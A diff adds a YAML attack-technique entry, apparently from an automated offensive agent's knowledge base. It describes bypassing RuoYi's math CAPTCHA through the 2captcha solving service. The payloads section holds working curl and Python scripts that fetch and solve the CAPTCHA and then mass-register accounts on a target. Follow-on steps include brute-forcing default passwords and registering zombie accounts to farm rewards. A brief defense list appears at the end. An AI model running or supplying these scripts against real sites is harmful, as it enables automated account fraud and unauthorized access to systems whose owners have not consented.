@@ -1,0 +1,126 @@
+id: "auth-ruoyi-captcha-bypass-2captcha"
+name: "2captcha绕过RuoYi数学验证码"
+category: "auth"
+subcategory: "captcha-bypass"
+severity: "high"
+
+description: |
+  RuoYi框架默认使用简单的数学计算验证码(如"9-2=?")。2captcha打码平台
+  可识别此类验证码图片，但返回的是表达式文本(如"9-2=?")而非答案。需在
+  调用端自行解析表达式并计算结果。结合验证码绕过，可完成自动化注册/登录
+  爆破。
+
+  实战中成功率约60%(5次中3次通过验证码验证)，失败多为2captcha误识别。
+
+trigger_signals:
+  - "GET /captchaImage 返回 {\"captchaEnabled\":true,\"uuid\":\"...\",\"img\":\"base64...\"}"
+  - "验证码图片尺寸为160x60(JPEG, RuoYi标准)"
+  - "注册/登录接口返回'验证码错误'/'验证码已失效'"
+  - "验证码图片内容为'数字±数字=?'格式"
+
+payloads:
+  - technique: "获取验证码"
+    payload: |
+      captcha_json=$(curl -s "https://target/prod-api/captchaImage")
+      uuid=$(echo "$captcha_json" | jq -r '.uuid')
+      echo "$captcha_json" | jq -r '.img' | base64 -d > captcha.jpg
+    note: "UUID用于关联验证码答案，有效期通常5分钟"
+  
+  - technique: "提交2captcha打码"
+    payload: |
+      captcha2 solve-image --file captcha.jpg
+      # 返回: {"solution":{"text":"9-2=?"}}
+    note: "返回的是表达式文本，不是答案！需自行计算"
+  
+  - technique: "计算答案并注册"
+    payload: |
+      code=$(python3 -c "
+      import re
+      t='9-2=?'  # 2captcha返回的文本
+      if '=?' in t:
+          expr=t.replace('=?','').replace(' ','')
+          print(eval(expr))  # 输出: 7
+      else:
+          print(t)
+      ")
+      
+      curl -X POST https://target/prod-api/register \
+        -H 'Content-Type: application/json' \
+        -d "{\"username\":\"hacker99\",\"password\":\"Pass@123\",\
+             \"code\":\"$code\",\"uuid\":\"$uuid\"}"
+    note: "注意数字验证码(A-B=?)中2captcha可能把'?'误识别为数字，需加fallback"
+
+  - technique: "Python全流程自动化"
+    payload: |
+      import requests, base64, json, re
+      
+      # 1. 获取验证码
+      r = requests.get(f"{BASE}/captchaImage")
+      captcha = r.json()
+      uuid = captcha["uuid"]
+      with open("/tmp/captcha.jpg", "wb") as f:
+          f.write(base64.b64decode(captcha["img"]))
+      
+      # 2. 打码
+      result = subprocess.run(["captcha2", "solve-image", "--file", "/tmp/captcha.jpg"],
+                              capture_output=True, text=True)
+      text = re.search(r'"text":\s*"([^"]+)"', result.stdout).group(1)
+      
+      # 3. 处理数学题
+      if '=?' in text:
+          code = str(eval(text.replace('=?','').replace(' ','')))
+      elif re.match(r'\d+[-+]\d+=\d+', text):
+          # 2captcha可能把?误识别为数字
+          code = str(eval(text.split('=')[0]))
+      else:
+          code = text
+      
+      # 4. 注册
+      requests.post(f"{BASE}/register", json={
+          "username": "hacker99", "password": "Pass@123",
+          "code": code, "uuid": uuid
+      })
+    note: "生产环境建议加重试逻辑和错误处理"
+
+success_indicators:
+  - "注册接口返回 {\"msg\":\"操作成功\",\"code\":200}"
+  - "登录接口返回带token的响应"
+  - "响应不是'验证码错误'或'验证码已失效'"
+
+prerequisites:
+  - "2captcha API Key已配置(环境变量TWOCAPTCHA_KEY)"
+  - "captcha2命令行工具可用"
+  - "目标验证码为RuoYi默认数学类型(非滑块/recaptcha)"
+  - "目标注册/登录端点可公网访问"
+  - "UUID在有效期内(通常5分钟)"
+
+upgrade_paths:
+  - "注册账号→登录→获取JWT→访问用户态API"
+  - "爆破默认密码(如发现sys.user.initPassword=123456)"
+  - "批量注册僵尸账号→刷活动奖励/返水"
+  - "结合未授权配置写入→注册后可以用户身份操作"
+
+defense:
+  - "升级验证码为滑块/recaptcha/Cloudflare Turnstile"
+  - "增加验证码重试次数限制(同一UUID最多3次)"
+  - "注册接口添加IP频率限制"
+  - "验证码图片增加噪点和扭曲提高识别难度"
+
+sources:
+  - agent: "黑骡 v1.1.0"
+    date: "2026-07-21"
+  - ref: "CWE-287: Improper Authentication"
+  - ref: "CWE-804: Guessable CAPTCHA"
+
+tools:
+  - "captcha2"
+  - "curl"
+  - "Python requests + re"
+
+confidence: "high"
+
+limitations:
+  - "2captcha准确率约60%，可能需要多次重试"
+  - "数学表达式格式变化(如'6+5=?')需适配解析逻辑"
+  - "验证码UUID过期后需重新获取"
+  - "部分RuoYi部署使用滑块验证码(本技术不适用)"
